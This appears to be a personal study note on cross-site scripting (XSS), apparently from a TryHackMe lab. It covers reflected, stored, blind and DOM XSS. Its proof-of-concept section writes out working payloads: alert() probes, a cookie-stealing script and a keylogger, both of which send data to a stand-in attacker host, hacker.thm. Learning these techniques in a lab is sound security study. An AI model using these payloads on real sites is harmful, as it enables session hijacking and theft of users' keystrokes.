![](Pasted%20image%2020241112155322.png)

# [Introduction]()

In XSS attacker injects malicious JavaScript code in a vulnerable web server. There are two types of XSS.

- Reflected XSS
- Stored XSS

## [Reflected  XSS]()

In this scenario, attacker sends the payload to via URL and response is reflected back. 

![](Pasted%20image%2020241112181518.png)

## [Stored XSS]()

In this payload is stored in the database and website uses it every from user load the page from the data making the attack persistent.

![](Pasted%20image%2020241114200253.png)

## [Blind XSS]()

In this attack, attacker cannot see the payload working on the website.

## [DOM XSS]()

Look for variables that can be exploited in the JS code from the URL

![](Pasted%20image%2020241114204112.png)

This code take num variable from URL and appending to img tag this can be exploited by changing the URL to below

![](Pasted%20image%2020241114205055.png)
 
![](Pasted%20image%2020241114205018.png)

# [POC]()

## [General usage]()

After putting JavaScript code to web page's input field if the page reacts as per the code then the web page is vulnerable to XSS

```
<script>alert('XSS');</script>
```

```
<img src="123" onerror="alert('test')" />
```

## [Session stealing]()

Most users details are stored in the form of cookies. This can be accessed by document.cookie. btoa function convert parameter to base64 and fetch function generating request to attackers webserver, giving access to users cookies when they visit infected page.

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

## [Key Logger]()

Below is similar version of JS code that sends base64 to attacker of the key - on key press.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```


# [References]()

- https://tryhackme.com/r/room/xss
- https://www.youtube.com/watch?v=EubBgig6qYs